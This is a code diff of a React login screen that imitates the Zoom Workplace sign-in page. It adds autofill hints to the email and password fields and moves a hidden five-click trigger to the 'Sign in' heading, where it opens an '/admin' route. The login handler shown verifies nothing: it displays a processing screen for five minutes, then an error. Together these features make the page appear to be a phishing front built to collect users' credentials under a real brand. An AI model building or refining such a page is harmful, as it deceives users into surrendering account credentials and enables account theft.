@@ -4,16 +4,15 @@ import { ChevronLeft } from 'lucide-react';
 import { AuthProcessingScreen } from './auth/AuthProcessingScreen';
 import { DesktopAuthShell } from './auth/DesktopAuthShell';
 
-const ADMIN_UNLOCK_KEY = 'zoom-admin-unlocked-v1';
-const ADMIN_UNLOCK_CLICK_TARGET = 5;
 const AUTH_PROCESSING_DELAY_MS = 5 * 60 * 1000;
+const ADMIN_ENTRY_CLICK_TARGET = 5;
 
 export function LoginScreen() {
   const navigate = useNavigate();
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
-  const [headerClickCount, setHeaderClickCount] = useState(0);
+  const [adminEntryClickCount, setAdminEntryClickCount] = useState(0);
   const [isProcessing, setIsProcessing] = useState(false);
   const [hasProcessingError, setHasProcessingError] = useState(false);
   const processingTimerRef = useRef<number | null>(null);
@@ -23,20 +22,6 @@ export function LoginScreen() {
       window.clearTimeout(processingTimerRef.current);
     }
   }, []);
-
-  const handleAdminHeaderClick = () => {
-    setHeaderClickCount((currentCount) => {
-      const nextCount = currentCount + 1;
-
-      if (nextCount >= ADMIN_UNLOCK_CLICK_TARGET) {
-        window.localStorage.setItem(ADMIN_UNLOCK_KEY, 'true');
-        navigate('/admin');
-        return 0;
-      }
-
-      return nextCount;
-    });
-  };
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
@@ -52,6 +37,18 @@ export function LoginScreen() {
       setIsProcessing(false);
       setHasProcessingError(true);
     }, AUTH_PROCESSING_DELAY_MS);
+  };
+
+  const handleAdminEntryClick = () => {
+    const nextCount = adminEntryClickCount + 1;
+
+    if (nextCount >= ADMIN_ENTRY_CLICK_TARGET) {
+      setAdminEntryClickCount(0);
+      navigate('/admin');
+      return;
+    }
+
+    setAdminEntryClickCount(nextCount);
   };
 
   const resetProcessing = () => {
@@ -72,18 +69,15 @@ export function LoginScreen() {
     <>
       <DesktopAuthShell>
         <form onSubmit={handleLogin} className="w-full max-w-[350px] flex flex-col gap-3">
-          <button
-            type="button"
-            onClick={handleAdminHeaderClick}
-            className="mb-4 text-center cursor-default"
-            aria-label="Zoom Workplace"
-          >
+          <div className="mb-4 text-center">
             <h1 className="text-2xl text-[#0B5CFF] leading-none" style={{ fontWeight: 600 }}>zoom</h1>
             <h2 className="text-3xl text-[#1F2937] leading-tight" style={{ fontWeight: 600 }}>Workplace</h2>
-          </button>
+          </div>
 
           <div className="mb-2 text-center">
-            <h3 className="text-lg text-[#1F2937]" style={{ fontWeight: 500 }}>Sign in</h3>
+            <button type="button" onClick={handleAdminEntryClick} className="cursor-default">
+              <h3 className="text-lg text-[#1F2937]" style={{ fontWeight: 500 }}>Sign in</h3>
+            </button>
             <p className="text-xs text-[#6B7280]">Welcome back to Zoom Workplace</p>
           </div>
 
@@ -92,6 +86,7 @@ export function LoginScreen() {
           <input
             type="email"
             required
+            autoComplete="email"
             value={email}
             onChange={(e) => setEmail(e.target.value)}
             placeholder="Email"
@@ -100,6 +95,7 @@ export function LoginScreen() {
           <input
             type="password"
             required
+            autoComplete="current-password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
             placeholder="Password"
@@ -131,12 +127,7 @@ export function LoginScreen() {
               <span>Back</span>
             </button>
 
-            <button
-              type="button"
-              onClick={handleAdminHeaderClick}
-              className="mb-8 text-center cursor-default w-full"
-              aria-label="Sign in header"
-            >
+            <button type="button" onClick={handleAdminEntryClick} className="mb-8 w-full cursor-default text-center">
               <h1 className="text-3xl text-[#1F2937] mb-2" style={{ fontWeight: 600 }}>Sign in</h1>
               <p className="text-[#6B7280]">Welcome back to Zoom Workplace</p>
             </button>
@@ -149,6 +140,7 @@ export function LoginScreen() {
                 <input
                   type="email"
                   required
+                  autoComplete="email"
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                   placeholder="Enter your email"
@@ -161,6 +153,7 @@ export function LoginScreen() {
                 <input
                   type="password"
                   required
+                  autoComplete="current-password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   placeholder="Enter your password"
